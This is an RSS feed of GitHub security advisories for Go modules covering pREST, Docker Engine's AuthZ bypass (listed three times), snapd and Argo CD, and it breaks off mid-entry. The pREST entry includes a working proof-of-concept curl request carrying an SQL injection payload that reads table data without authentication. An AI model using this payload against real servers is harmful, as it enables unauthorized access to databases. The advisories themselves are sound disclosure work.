<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-07-31T09:02:14.187Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/prest/prest] pREST vulnerable to jwt bypass + sql injection]]></title>
        <id>https://github.com/advisories/GHSA-wm25-j4gw-6vr3</id>
        <link href="https://github.com/advisories/GHSA-wm25-j4gw-6vr3"/>
        <updated>2024-07-30T15:04:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Probably jwt bypass + sql injection
or what i'm doing wrong?</p>
<h3 id="poc-how-to-reproduce">PoC (how to reproduce)</h3>
<ol>
<li>Create following files:</li>
</ol>
<p>docker-compose.yml:</p>
<pre><code>services:
  postgres:
    image: postgres
    container_name: postgres_container_mre
    environment:
      POSTGRES_USER: test_user_pg
      POSTGRES_PASSWORD: test_pass_pg
      POSTGRES_DB: test_db
  prest:
    image: prest/prest
    build: .
    volumes:
      - ./queries:/queries
      - ./migrations:/migrations
    ports:
      - "3000:3000"
</code></pre>
<p>Dockerfile:</p>
<pre><code>from prest/prest:latest

COPY ./prest.toml prest.toml
</code></pre>
<p>prest.toml:</p>
<pre><code>debug=false
migrations = "./migrations"

[http]
port = 3000

[jwt]
default = true
key = "secret"
algo = "HS256"

[auth]
enabled = true
type = "body"
encrypt = "MD5"
table = "prest_users"
username = "username"
password = "password"

[pg]
URL = "postgresql://test_user_pg:test_pass_pg@postgres:5432/test_db/?sslmode=disable"

[ssl]
mode = "disable"
sslcert = "./PATH"
sslkey = "./PATH"
sslrootcert = "./PATH"

[expose]
enabled = true
databases = true
schemas = true
tables = true

[queries]
location = "/queries"
</code></pre>
<ol start="2">
<li>run commands:</li>
</ol>
<pre><code>mkdir -p migrations queries
docker compose up --build -d
</code></pre>
<p>wait for pg and prest, then run following to add test data to the pg:</p>
<pre><code>export PGPASSWORD=test_pass_pg
docker exec -it postgres_container_mre psql -U test_user_pg -d test_db -c "CREATE TABLE IF NOT EXISTS public.some_table (id int primary key, secret_data text);\
INSERT INTO public.some_table (id, secret_data) VALUES (1, 'some secret text') ON CONFLICT DO NOTHING;"
</code></pre>
<ol start="3">
<li>SQL injection even without jwt token:</li>
</ol>
<pre><code>curl --location '127.0.0.1:3000/test_db/public".some_table)%20s;--/auth'
</code></pre>
<p>output:</p>
<pre><code>[{"id": 1, "secret_data": "some secret text"}]
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/prest/prest/security/advisories/GHSA-wm25-j4gw-6vr3">https://github.com/prest/prest/security/advisories/GHSA-wm25-j4gw-6vr3</a></li>
<li><a href="https://github.com/prest/prest/commit/96ff96cfdc7ad6dd86e2289fcd5a37ee70c8926e">https://github.com/prest/prest/commit/96ff96cfdc7ad6dd86e2289fcd5a37ee70c8926e</a></li>
<li><a href="https://github.com/advisories/GHSA-wm25-j4gw-6vr3">https://github.com/advisories/GHSA-wm25-j4gw-6vr3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wm25-j4gw-6vr3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-30T15:04:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] Authz zero length regression]]></title>
        <id>https://github.com/advisories/GHSA-v23v-6jw2-98fq</id>
        <link href="https://github.com/advisories/GHSA-v23v-6jw2-98fq"/>
        <updated>2024-07-30T10:18:58.000Z</updated>
        <content type="html"><![CDATA[<p>A security vulnerability has been detected in certain versions of Docker Engine, which could allow an attacker to bypass <a href="https://docs.docker.com/engine/extend/plugins_authorization/">authorization plugins (AuthZ)</a> under specific circumstances. The base likelihood of this being exploited is low. This advisory outlines the issue, identifies the affected versions, and provides remediation steps for impacted users.</p>
<h3 id="impact">Impact</h3>
<p>Using a specially-crafted API request, an Engine API client could make the daemon forward the request or response to an <a href="https://docs.docker.com/engine/extend/plugins_authorization/">authorization plugin</a> without the body. In certain circumstances, the authorization plugin may allow a request which it would have otherwise denied if the body had been forwarded to it.</p>
<p>A security issue was discovered In 2018,  where an attacker could bypass AuthZ plugins using a specially crafted API request. This could lead to unauthorized actions, including privilege escalation. Although this issue was fixed in Docker Engine <a href="https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1">v18.09.1</a> in January 2019, the fix was not carried forward to later major versions, resulting in a regression. Anyone who depends on authorization plugins that introspect the request and/or response body to make access control decisions is potentially impacted.</p>
<p>Docker EE v19.03.x and all versions of Mirantis Container Runtime <strong>are not vulnerable.</strong></p>
<h3 id="vulnerability-details">Vulnerability details</h3>
<ul>
<li><strong>AuthZ bypass and privilege escalation:</strong> An attacker could exploit a bypass using an API request with Content-Length set to 0, causing the Docker daemon to forward the request without the body to the AuthZ plugin, which might approve the request incorrectly.</li>
<li><strong>Initial fix:</strong> The issue was fixed in Docker Engine <a href="https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1">v18.09.1</a> January 2019..</li>
<li><strong>Regression:</strong> The fix was not included in Docker Engine v19.03 or newer versions. This was identified in April 2024 and patches were released for the affected versions on July 23, 2024. The issue was assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-41110">CVE-2024-41110</a>.</li>
</ul>
<h3 id="patches">Patches</h3>
<ul>
<li>docker-ce v27.1.1 containes patches to fix the vulnerability.</li>
<li>Patches have also been merged into the master, 19.0, 20.0, 23.0, 24.0, 25.0, 26.0, and 26.1 release branches.</li>
</ul>
<h3 id="remediation-steps">Remediation steps</h3>
<ul>
<li>If you are running an affected version, update to the most recent patched version.</li>
<li>Mitigation if unable to update immediately:<ul>
<li>Avoid using AuthZ plugins.</li>
<li>Restrict access to the Docker API to trusted parties, following the principle of least privilege.</li>
</ul>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>
<li><a href="https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>
<li><a href="https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq">https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41110">https://nvd.nist.gov/vuln/detail/CVE-2024-41110</a></li>
<li><a href="https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191">https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191</a></li>
<li><a href="https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76">https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76</a></li>
<li><a href="https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919">https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919</a></li>
<li><a href="https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b">https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b</a></li>
<li><a href="https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0">https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0</a></li>
<li><a href="https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>
<li><a href="https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00">https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00</a></li>
<li><a href="https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f">https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f</a></li>
<li><a href="https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801">https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801</a></li>
<li><a href="https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>
<li><a href="https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin</a></li>
<li><a href="https://github.com/advisories/GHSA-v23v-6jw2-98fq">https://github.com/advisories/GHSA-v23v-6jw2-98fq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v23v-6jw2-98fq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-30T10:18:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] Authz zero length regression]]></title>
        <id>https://github.com/advisories/GHSA-v23v-6jw2-98fq</id>
        <link href="https://github.com/advisories/GHSA-v23v-6jw2-98fq"/>
        <updated>2024-07-30T10:18:58.000Z</updated>
        <content type="html"><![CDATA[<p>A security vulnerability has been detected in certain versions of Docker Engine, which could allow an attacker to bypass <a href="https://docs.docker.com/engine/extend/plugins_authorization/">authorization plugins (AuthZ)</a> under specific circumstances. The base likelihood of this being exploited is low. This advisory outlines the issue, identifies the affected versions, and provides remediation steps for impacted users.</p>
<h3 id="impact">Impact</h3>
<p>Using a specially-crafted API request, an Engine API client could make the daemon forward the request or response to an <a href="https://docs.docker.com/engine/extend/plugins_authorization/">authorization plugin</a> without the body. In certain circumstances, the authorization plugin may allow a request which it would have otherwise denied if the body had been forwarded to it.</p>
<p>A security issue was discovered In 2018,  where an attacker could bypass AuthZ plugins using a specially crafted API request. This could lead to unauthorized actions, including privilege escalation. Although this issue was fixed in Docker Engine <a href="https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1">v18.09.1</a> in January 2019, the fix was not carried forward to later major versions, resulting in a regression. Anyone who depends on authorization plugins that introspect the request and/or response body to make access control decisions is potentially impacted.</p>
<p>Docker EE v19.03.x and all versions of Mirantis Container Runtime <strong>are not vulnerable.</strong></p>
<h3 id="vulnerability-details">Vulnerability details</h3>
<ul>
<li><strong>AuthZ bypass and privilege escalation:</strong> An attacker could exploit a bypass using an API request with Content-Length set to 0, causing the Docker daemon to forward the request without the body to the AuthZ plugin, which might approve the request incorrectly.</li>
<li><strong>Initial fix:</strong> The issue was fixed in Docker Engine <a href="https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1">v18.09.1</a> January 2019..</li>
<li><strong>Regression:</strong> The fix was not included in Docker Engine v19.03 or newer versions. This was identified in April 2024 and patches were released for the affected versions on July 23, 2024. The issue was assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-41110">CVE-2024-41110</a>.</li>
</ul>
<h3 id="patches">Patches</h3>
<ul>
<li>docker-ce v27.1.1 containes patches to fix the vulnerability.</li>
<li>Patches have also been merged into the master, 19.0, 20.0, 23.0, 24.0, 25.0, 26.0, and 26.1 release branches.</li>
</ul>
<h3 id="remediation-steps">Remediation steps</h3>
<ul>
<li>If you are running an affected version, update to the most recent patched version.</li>
<li>Mitigation if unable to update immediately:<ul>
<li>Avoid using AuthZ plugins.</li>
<li>Restrict access to the Docker API to trusted parties, following the principle of least privilege.</li>
</ul>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>
<li><a href="https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>
<li><a href="https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq">https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41110">https://nvd.nist.gov/vuln/detail/CVE-2024-41110</a></li>
<li><a href="https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191">https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191</a></li>
<li><a href="https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76">https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76</a></li>
<li><a href="https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919">https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919</a></li>
<li><a href="https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b">https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b</a></li>
<li><a href="https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0">https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0</a></li>
<li><a href="https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>
<li><a href="https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00">https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00</a></li>
<li><a href="https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f">https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f</a></li>
<li><a href="https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801">https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801</a></li>
<li><a href="https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>
<li><a href="https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin</a></li>
<li><a href="https://github.com/advisories/GHSA-v23v-6jw2-98fq">https://github.com/advisories/GHSA-v23v-6jw2-98fq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v23v-6jw2-98fq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-30T10:18:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] Authz zero length regression]]></title>
        <id>https://github.com/advisories/GHSA-v23v-6jw2-98fq</id>
        <link href="https://github.com/advisories/GHSA-v23v-6jw2-98fq"/>
        <updated>2024-07-30T10:18:58.000Z</updated>
        <content type="html"><![CDATA[<p>A security vulnerability has been detected in certain versions of Docker Engine, which could allow an attacker to bypass <a href="https://docs.docker.com/engine/extend/plugins_authorization/">authorization plugins (AuthZ)</a> under specific circumstances. The base likelihood of this being exploited is low. This advisory outlines the issue, identifies the affected versions, and provides remediation steps for impacted users.</p>
<h3 id="impact">Impact</h3>
<p>Using a specially-crafted API request, an Engine API client could make the daemon forward the request or response to an <a href="https://docs.docker.com/engine/extend/plugins_authorization/">authorization plugin</a> without the body. In certain circumstances, the authorization plugin may allow a request which it would have otherwise denied if the body had been forwarded to it.</p>
<p>A security issue was discovered In 2018,  where an attacker could bypass AuthZ plugins using a specially crafted API request. This could lead to unauthorized actions, including privilege escalation. Although this issue was fixed in Docker Engine <a href="https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1">v18.09.1</a> in January 2019, the fix was not carried forward to later major versions, resulting in a regression. Anyone who depends on authorization plugins that introspect the request and/or response body to make access control decisions is potentially impacted.</p>
<p>Docker EE v19.03.x and all versions of Mirantis Container Runtime <strong>are not vulnerable.</strong></p>
<h3 id="vulnerability-details">Vulnerability details</h3>
<ul>
<li><strong>AuthZ bypass and privilege escalation:</strong> An attacker could exploit a bypass using an API request with Content-Length set to 0, causing the Docker daemon to forward the request without the body to the AuthZ plugin, which might approve the request incorrectly.</li>
<li><strong>Initial fix:</strong> The issue was fixed in Docker Engine <a href="https://docs.docker.com/engine/release-notes/18.09/#security-fixes-1">v18.09.1</a> January 2019..</li>
<li><strong>Regression:</strong> The fix was not included in Docker Engine v19.03 or newer versions. This was identified in April 2024 and patches were released for the affected versions on July 23, 2024. The issue was assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-41110">CVE-2024-41110</a>.</li>
</ul>
<h3 id="patches">Patches</h3>
<ul>
<li>docker-ce v27.1.1 containes patches to fix the vulnerability.</li>
<li>Patches have also been merged into the master, 19.0, 20.0, 23.0, 24.0, 25.0, 26.0, and 26.1 release branches.</li>
</ul>
<h3 id="remediation-steps">Remediation steps</h3>
<ul>
<li>If you are running an affected version, update to the most recent patched version.</li>
<li>Mitigation if unable to update immediately:<ul>
<li>Avoid using AuthZ plugins.</li>
<li>Restrict access to the Docker API to trusted parties, following the principle of least privilege.</li>
</ul>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>
<li><a href="https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>
<li><a href="https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin/</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq">https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41110">https://nvd.nist.gov/vuln/detail/CVE-2024-41110</a></li>
<li><a href="https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191">https://github.com/moby/moby/commit/411e817ddf710ff8e08fa193da80cb78af708191</a></li>
<li><a href="https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76">https://github.com/moby/moby/commit/42f40b1d6dd7562342f832b9cd2adf9e668eeb76</a></li>
<li><a href="https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919">https://github.com/moby/moby/commit/65cc597cea28cdc25bea3b8a86384b4251872919</a></li>
<li><a href="https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b">https://github.com/moby/moby/commit/852759a7df454cbf88db4e954c919becd48faa9b</a></li>
<li><a href="https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0">https://github.com/moby/moby/commit/a31260625655cff9ae226b51757915e275e304b0</a></li>
<li><a href="https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1">https://github.com/moby/moby/commit/a79fabbfe84117696a19671f4aa88b82d0f64fc1</a></li>
<li><a href="https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00">https://github.com/moby/moby/commit/ae160b4edddb72ef4bd71f66b975a1a1cc434f00</a></li>
<li><a href="https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f">https://github.com/moby/moby/commit/ae2b3666c517c96cbc2adf1af5591a6b00d4ec0f</a></li>
<li><a href="https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801">https://github.com/moby/moby/commit/cc13f952511154a2866bddbb7dddebfe9e83b801</a></li>
<li><a href="https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb">https://github.com/moby/moby/commit/fc274cd2ff4cf3b48c91697fb327dd1fb95588fb</a></li>
<li><a href="https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin">https://www.docker.com/blog/docker-security-advisory-docker-engine-authz-plugin</a></li>
<li><a href="https://github.com/advisories/GHSA-v23v-6jw2-98fq">https://github.com/advisories/GHSA-v23v-6jw2-98fq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v23v-6jw2-98fq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-30T10:18:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/snapcore/snapd] snapd failed to restrict writes to the $HOME/bin path]]></title>
        <id>https://github.com/advisories/GHSA-4mh8-9689-38vr</id>
        <link href="https://github.com/advisories/GHSA-4mh8-9689-38vr"/>
        <updated>2024-07-26T21:34:23.000Z</updated>
        <content type="html"><![CDATA[<p>In snapd versions prior to 2.62, when using AppArmor for enforcement of sandbox permissions, snapd failed to restrict writes to the $HOME/bin path. In Ubuntu, when this path exists, it is automatically added to the users PATH. An attacker who could convince a user to install a malicious snap which used the 'home' plug could use this vulnerability to install arbitrary scripts into the users PATH which may then be run by the user outside of the expected snap sandbox and hence allow them to escape confinement.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1724">https://nvd.nist.gov/vuln/detail/CVE-2024-1724</a></li>
<li><a href="https://github.com/snapcore/snapd/pull/13689">https://github.com/snapcore/snapd/pull/13689</a></li>
<li><a href="https://github.com/snapcore/snapd/commit/aa191f97713de8dc3ce3ac818539f0b976eb8ef6">https://github.com/snapcore/snapd/commit/aa191f97713de8dc3ce3ac818539f0b976eb8ef6</a></li>
<li><a href="https://gld.mcphail.uk/posts/explaining-cve-2024-1724">https://gld.mcphail.uk/posts/explaining-cve-2024-1724</a></li>
<li><a href="https://github.com/advisories/GHSA-4mh8-9689-38vr">https://github.com/advisories/GHSA-4mh8-9689-38vr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mh8-9689-38vr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-25T21:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/snapcore/snapd] snapd failed to properly check the file type when extracting a snap]]></title>
        <id>https://github.com/advisories/GHSA-64jh-cjwc-w8q6</id>
        <link href="https://github.com/advisories/GHSA-64jh-cjwc-w8q6"/>
        <updated>2024-07-26T21:32:59.000Z</updated>
        <content type="html"><![CDATA[<p>In snapd versions prior to 2.62, snapd failed to properly check the file type when extracting a snap. The snap format is a squashfs file-system image and so can contain files that are non-regular files (such as pipes or sockets etc). Various file entries within the snap squashfs image (such as icons etc) are directly read by snapd when it is extracted. An attacker who could convince a user to install a malicious snap which contained non-regular files at these paths could then cause snapd to block indefinitely trying to read from such files and cause a denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29068">https://nvd.nist.gov/vuln/detail/CVE-2024-29068</a></li>
<li><a href="https://github.com/snapcore/snapd/pull/13682">https://github.com/snapcore/snapd/pull/13682</a></li>
<li><a href="https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063">https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063</a></li>
<li><a href="https://github.com/advisories/GHSA-64jh-cjwc-w8q6">https://github.com/advisories/GHSA-64jh-cjwc-w8q6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64jh-cjwc-w8q6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-25T21:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/snapcore/snapd] snapd failed to properly check the destination of symbolic links when extracting a snap]]></title>
        <id>https://github.com/advisories/GHSA-69p6-gp5x-j269</id>
        <link href="https://github.com/advisories/GHSA-69p6-gp5x-j269"/>
        <updated>2024-07-26T16:39:57.000Z</updated>
        <content type="html"><![CDATA[<p>In snapd versions prior to 2.62, snapd failed to properly check the destination of symbolic links when extracting a snap. The snap format is a squashfs file-system image and so can contain symbolic links and other file types. Various file entries within the snap squashfs image (such as icons and desktop files etc) are directly read by snapd when it is extracted. An attacker who could convince a user to install a malicious snap which contained symbolic links at these paths could then cause snapd to write out the contents of the symbolic link destination into a world-readable directory. This in-turn could allow an unprivileged user to gain access to privileged information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29069">https://nvd.nist.gov/vuln/detail/CVE-2024-29069</a></li>
<li><a href="https://github.com/snapcore/snapd/pull/13682">https://github.com/snapcore/snapd/pull/13682</a></li>
<li><a href="https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063">https://github.com/snapcore/snapd/commit/b66fee81606a1c05f965a876ccbaf44174194063</a></li>
<li><a href="https://github.com/advisories/GHSA-69p6-gp5x-j269">https://github.com/advisories/GHSA-69p6-gp5x-j269</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69p6-gp5x-j269</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-25T21:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd] The Argo CD web terminal session does not handle the revocation of user permissions properly]]></title>
        <id>https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</id>
        <link href="https://github.com/advisories/GHSA-v8wx-v5jq-qhhw"/>
        <updated>2024-07-24T20:54:03.000Z</updated>
        <content type="html"><![CDATA[<p>Argo CD v2.11.3 and before, discovering that even if the user's <code>p, role:myrole, exec, create, */*, allow</code> permissions are revoked, the user can still send any Websocket message, which allows the user to view sensitive information. Even though they shouldn't have such access.</p>
<h2 id="description">Description</h2>
<p>Argo CD has a Web-based terminal that allows you to get a shell inside a running pod, just like you would with kubectl exec. However, when the administrator enables this function and grants permission to the user <code>p, role:myrole, exec, create, */*, allow</code>, even if the user revokes this permission, the user can still perform operations in the container, as long as the user keeps the terminal view open for a long time. CVE-2023-40025 Although the token expiration and revocation of the user are fixed, however, the fix does not address the situation of revocation of only user <code>p, role:myrole, exec, create, */*, allow</code> permissions, which may still lead to the leakage of sensitive information.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.7
v2.10.16
v2.9.21</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by 
Shengjie Li, Huazhong University of Science and Technology
Zhi Li, Huazhong University of Science and Technology
Weijie Liu, Nankai University</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw">https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41666">https://nvd.nist.gov/vuln/detail/CVE-2024-41666</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476">https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6">https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4">https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4</a></li>
<li><a href="https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing">https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing</a></li>
<li><a href="https://github.com/advisories/GHSA-v8wx-v5jq-qhhw">https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</a></li>
</ul>
]]></content>
        <author>
